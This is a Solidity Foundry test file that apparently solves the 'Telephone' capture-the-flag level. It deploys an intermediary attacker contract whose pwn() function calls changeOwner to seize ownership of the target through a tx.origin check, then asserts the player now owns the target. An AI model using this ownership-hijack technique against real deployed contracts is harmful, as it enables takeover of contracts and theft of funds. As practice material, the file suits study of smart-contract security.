// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "../src/Telephone.sol";
import {Test} from "forge-std/Test.sol";

// Your Attacker Contract
contract TelephoneAttack {
    Telephone public target;

    constructor(address _targetAddress) {
        target = Telephone(_targetAddress);
    }

    function pwn() external {
        target.changeOwner(msg.sender);
    }
}

// The Foundry Test Suite
contract TelephoneTest is Test {
    Telephone telephoneTarget;
    address player = makeAddr("player");

    function setUp() public {
        telephoneTarget = new Telephone();
    }

    function testTelephoneExploit() public {
        vm.startPrank(player);

        // 1. Deploy attacker contract pointing to the imported target
        TelephoneAttack attacker = new TelephoneAttack(address(telephoneTarget));

        // 2. Execute exploit
        attacker.pwn();

        vm.stopPrank();

        // 3. Verify ownership transfer
        assertEq(telephoneTarget.owner(), player);
    }
}
